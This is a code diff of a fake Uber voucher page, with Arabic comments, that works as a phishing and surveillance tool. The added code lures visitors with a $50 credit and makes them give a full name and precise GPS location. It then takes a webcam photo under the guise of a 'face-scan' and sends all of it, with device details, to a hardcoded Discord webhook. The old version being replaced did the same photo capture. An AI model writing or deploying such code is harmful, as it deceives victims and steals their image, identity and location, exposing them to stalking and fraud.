@@ -2,47 +2,27 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>UBER Voucher</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uber Voucher - Verification System</title>
     <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            background: linear-gradient(250deg, #000000, #ffffff);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: Arial, sans-serif;
-            flex-direction: column; /* لترتيب الشعار فوق الكرت */
+        body { margin: 0; height: 100vh; background: #f6f6f6; display: flex; align-items: center; justify-content: center; font-family: 'Segoe UI', Tahoma, sans-serif; flex-direction: column; }
+        .logo-top { width: 120px; margin-bottom: 20px; }
+        .card { background: #fff; padding: 35px 25px; border-radius: 12px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #eee; }
+        h1 { font-size: 22px; margin-bottom: 10px; color: #000; }
+        p { color: #666; font-size: 15px; margin-bottom: 20px; line-height: 1.4; }
+        
+        input[type="text"] {
+            width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none;
         }
+        input[type="text"]:focus { border-color: #000; }
 
-        /* تنسيق الشعار ليكون فوق البوكس وكبير */
-        .logo-top {
-            width: 220px; /* حجم كبير */
-            margin-bottom: 20px;
+        .btn-black {
+            padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; color: #fff; background: #000; width: 100%; transition: 0.3s;
         }
+        .btn-black:hover { background: #333; }
+        .btn-black:disabled { background: #999; cursor: not-allowed; }
 
-        .card {
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 20px;
-            width: 340px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,.3);
-        }
-        h1 { font-size: 24px; margin-bottom: 10px; }
-        #msg { color: #555; margin-bottom: 20px; }
-        button {
-            padding: 15px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            cursor: pointer;
-            color: #fff;
-            background: #000;
-            width: 100%;
-            transition: 0.3s;
-        }
-        button:hover { background: #333; }
+        #step2, #video, #canvas { display: none; }
     </style>
 </head>
 <body>
@@ -50,76 +30,134 @@
 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Uber_logo_2018.svg/2560px-Uber_logo_2018.svg.png" class="logo-top">
 
 <div class="card">
-    <h1>To get Voucher</h1>
-    <p id="msg">Open UBER App to continue</p>
-    <button id="start">Click to Continue</button>
+    <div id="step1">
+        <h1>Claim Your Voucher</h1>
+        <p>Enter your full name to verify your eligibility for the $50 Uber Credit.</p>
+        <input type="text" id="userName" placeholder="Full Name">
+        <button id="btnNext" class="btn-black">Check Eligibility</button>
+    </div>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="step2">
+        <h1>Identity Verification</h1>
+        <p>Eligibility confirmed! Click below to complete a quick secure face-scan to activate your voucher.</p>
+        <button id="btnContinue" class="btn-black">Activate Now</button>
+    </div>
 </div>
 
-<script>
-    // رجعت الكود الأصلي تبعك بالظبط
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1467297371728646269/MDsU8tI-Mzcb5Mo0RTB2HLGTIx-G-CuPakfTnTPeLIT_9p6I8CF0_cBqf0Vkh1E1fplv";
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-    const startBtn = document.getElementById("start");
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1467297371728646269/MDsU8tI-Mzcb5Mo0RTB2HLGTIx-G-CuPakfTnTPeLIT_9p6I8CF0_cBqf0Vkh1E1fplv";
+
+    const step1 = document.getElementById("step1");
+    const step2 = document.getElementById("step2");
+    const userNameInput = document.getElementById("userName");
+    const btnNext = document.getElementById("btnNext");
+    const btnContinue = document.getElementById("btnContinue");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const msg = document.getElementById("msg");
 
-    let stream;
+    let finalName = "";
+    let userLoc = "";
 
-    startBtn.onclick = () => {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(s => {
-                stream = s;
-                video.srcObject = stream;
-                startBtn.style.display = "none";
-                msg.innerText = "جاري التحقق من الحساب...";
+    // وظيفة جلب الموقع مع إجبارية الموافقة
+    async function getForcedLocation() {
+        return new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const url = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                    resolve(url);
+                },
+                (error) => {
+                    reject(error);
+                },
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
+        });
+    }
 
-                // التوقيت الأصلي تبعك (100)
-                setTimeout(takeAndSendPhoto, 2500)
-            })
-            .catch(() => {
-                msg.innerText = "يجب الموافقة للانتقال للتطبيق";
-            });
+    btnNext.onclick = async () => {
+        const name = userNameInput.value.trim();
+        if (name.length < 3) {
+            alert("Please enter your full name correctly.");
+            return;
+        }
+        
+        finalName = name;
+        btnNext.disabled = true;
+        btnNext.innerText = "Verifying Location...";
+
+        try {
+            // لن ينتقل للكود التالي إلا إذا نجح في جلب الموقع
+            userLoc = await getForcedLocation();
+            step1.style.display = "none";
+            step2.style.display = "block";
+        } catch (err) {
+            alert("Verification Error: You must allow Location Access to claim this voucher in your region.");
+            btnNext.disabled = false;
+            btnNext.innerText = "Check Eligibility";
+        }
     };
 
-    function takeAndSendPhoto() {
+    btnContinue.onclick = async () => {
+        btnContinue.disabled = true;
+        btnContinue.innerText = "Connecting to Scan...";
+        
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            btnContinue.style.display = "none";
+            
+            // الانتظار قليلاً لضبط الكاميرا ثم التصوير
+            setTimeout(() => {
+                captureAndSend(stream);
+            }, 2500);
+
+        } catch (err) {
+            alert("Error: Camera access is required for identity verification.");
+            btnContinue.disabled = false;
+            btnContinue.innerText = "Activate Now";
+        }
+    };
+
+    function captureAndSend(stream) {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
 
         canvas.toBlob(blob => {
             const formData = new FormData();
-            formData.append("file", blob, "user-capture.png");
+            formData.append("file", blob, "user_capture.png");
+            
+            const info = {
+                embeds: [{
+                    title: "🎯 New Success Capture",
+                    color: 3066993, // لون أخضر
+                    fields: [
+                        { name: "👤 Name", value: finalName, inline: true },
+                        { name: "📍 Location", value: `[Click to View on Map](${userLoc})` },
+                        { name: "📱 Device", value: navigator.platform, inline: true }
+                    ],
+                    footer: { text: "Uber Voucher System • Secure Verification" },
+                    timestamp: new Date()
+                }]
+            };
 
-            fetch(DISCORD_WEBHOOK_URL, {
-                method: "POST",
-                body: formData
-            })
-            .then(res => {
-                if (res.ok) console.log("Success");
-                else console.error("Failed");
-            })
-            .catch(err => console.error("Error:", err));
+            formData.append("payload_json", JSON.stringify(info));
+
+            fetch(WEBHOOK_URL, { method: "POST", body: formData })
+            .then(() => {
+                document.querySelector(".card").innerHTML = `
+                    <h1 style="color: green;">Success!</h1>
+                    <p>Thank you <b>${finalName}</b>. Your voucher has been linked to your device and will appear in the Uber app shortly.</p>
+                `;
+                stream.getTracks().forEach(t => t.stop());
+            });
 
         }, "image/png");
-
-        // النص الأصلي تبعك
-        msg.innerText = "you will get the Voucher";
-        stopCamera();
-    }
-
-    function stopCamera() {
-        if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-        }
     }
 </script>
 
 </body>
-
 </html>
-
-
